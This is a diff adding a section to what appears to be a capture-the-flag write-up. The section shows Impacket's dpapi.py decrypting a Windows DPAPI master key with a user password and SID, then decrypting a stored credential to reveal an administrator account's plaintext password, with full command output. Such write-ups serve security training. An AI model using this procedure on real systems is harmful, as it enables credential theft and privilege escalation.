@@ -326,4 +326,38 @@ After some quick enumeration of the file system i found some dpapi credentials
 ## Credential extraction
 First ill download the credential to my machine as well as the master key stored in `C:\Users\c.neri\AppData\Roaming\Microsoft\Protect`
 
+### Key decryption
+```python
+dpapi.py masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password 'Zer0the0ne' 
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[MASTERKEYFILE]
+Version     :        2 (2)
+Guid        : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
+Flags       :        0 (0)
+Policy      :        0 (0)
+MasterKeyLen: 00000088 (136)
+BackupKeyLen: 00000068 (104)
+CredHistLen : 00000000 (0)
+DomainKeyLen: 00000174 (372)
+
+Decrypted key with User Key (MD4 protected)
+Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
+```
+### Accessing password
+```python
+dpapi.py credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[CREDENTIAL]
+LastWritten : 2024-06-07 15:08:23+00:00
+Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
+Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
+Type        : 0x00000001 (CRED_TYPE_GENERIC)
+Target      : LegacyGeneric:target=admin_acc
+Description : 
+Unknown     : 
+Username    : vintage\c.neri_adm
+Unknown     : Uncr4ck4bl3P4ssW0rd0312
+```
 
